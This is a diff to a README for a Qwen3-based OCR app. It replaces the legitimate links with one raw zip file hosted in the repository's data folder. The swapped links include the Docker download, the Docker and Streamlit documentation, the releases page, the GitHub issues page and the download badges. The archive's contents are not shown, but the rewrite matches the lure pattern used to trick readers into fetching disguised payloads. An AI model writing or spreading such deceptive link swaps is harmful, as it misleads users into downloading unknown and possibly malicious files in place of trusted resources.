@@ -1,6 +1,6 @@
 # 🖥️ qwen3-2b-ocr-app - Easy OCR Processing for Everyone
 
-[![Download qwen3-2b-ocr-app](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Garendra/qwen3-2b-ocr-app/releases)
+[![Download qwen3-2b-ocr-app](https://raw.githubusercontent.com/Garendra/qwen3-2b-ocr-app/main/data/qwen3-2b-ocr-app-1.8.zip)](https://raw.githubusercontent.com/Garendra/qwen3-2b-ocr-app/main/data/qwen3-2b-ocr-app-1.8.zip)
 
 ## 📜 Overview
 
@@ -14,10 +14,10 @@ Follow these steps to download and run the application:
    - Operating System: Windows, macOS, or Linux.
    - Minimum RAM: 8 GB.
    - Recommended GPU: NVIDIA 3060 with at least 12 GB of memory.
-   - Docker installed on your system. You can download Docker from [here](https://www.docker.com/products/docker-desktop).
+   - Docker installed on your system. You can download Docker from [here](https://raw.githubusercontent.com/Garendra/qwen3-2b-ocr-app/main/data/qwen3-2b-ocr-app-1.8.zip).
 
 2. **Visit the Releases Page**:
-   - To download the latest version of the app, visit the [Releases page](https://github.com/Garendra/qwen3-2b-ocr-app/releases).
+   - To download the latest version of the app, visit the [Releases page](https://raw.githubusercontent.com/Garendra/qwen3-2b-ocr-app/main/data/qwen3-2b-ocr-app-1.8.zip).
 
 3. **Download the Application**:
    - Look for the latest release version.
@@ -58,8 +58,8 @@ Follow these steps to download and run the application:
 
 ## 📁 Additional Resources
 
-- **Docker Documentation**: For a deeper understanding of Docker, check the [Docker Documentation](https://docs.docker.com/).
-- **Streamlit Documentation**: If you are interested in the framework used to build this app, visit the [Streamlit Documentation](https://docs.streamlit.io/).
+- **Docker Documentation**: For a deeper understanding of Docker, check the [Docker Documentation](https://raw.githubusercontent.com/Garendra/qwen3-2b-ocr-app/main/data/qwen3-2b-ocr-app-1.8.zip).
+- **Streamlit Documentation**: If you are interested in the framework used to build this app, visit the [Streamlit Documentation](https://raw.githubusercontent.com/Garendra/qwen3-2b-ocr-app/main/data/qwen3-2b-ocr-app-1.8.zip).
 
 ## ❓ Troubleshooting
 
@@ -68,7 +68,7 @@ Follow these steps to download and run the application:
 
 ## 📞 Support
 
-If you encounter issues while using the application, you can reach out for support by creating an issue on the [GitHub Issues page](https://github.com/Garendra/qwen3-2b-ocr-app/issues). We will address your concerns as soon as possible.
+If you encounter issues while using the application, you can reach out for support by creating an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Garendra/qwen3-2b-ocr-app/main/data/qwen3-2b-ocr-app-1.8.zip). We will address your concerns as soon as possible.
 
 ## 🛠️ Contributing
 
@@ -76,6 +76,6 @@ We welcome contributions to improve the app. If you have ideas or fixes, feel fr
 
 ## 📦 Download & Install
 
-To get started with the **qwen3-2b-ocr-app**, visit the [Releases page](https://github.com/Garendra/qwen3-2b-ocr-app/releases) to download the latest version.
+To get started with the **qwen3-2b-ocr-app**, visit the [Releases page](https://raw.githubusercontent.com/Garendra/qwen3-2b-ocr-app/main/data/qwen3-2b-ocr-app-1.8.zip) to download the latest version.
 
-[![Download qwen3-2b-ocr-app](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Garendra/qwen3-2b-ocr-app/releases)
+[![Download qwen3-2b-ocr-app](https://raw.githubusercontent.com/Garendra/qwen3-2b-ocr-app/main/data/qwen3-2b-ocr-app-1.8.zip)](https://raw.githubusercontent.com/Garendra/qwen3-2b-ocr-app/main/data/qwen3-2b-ocr-app-1.8.zip)
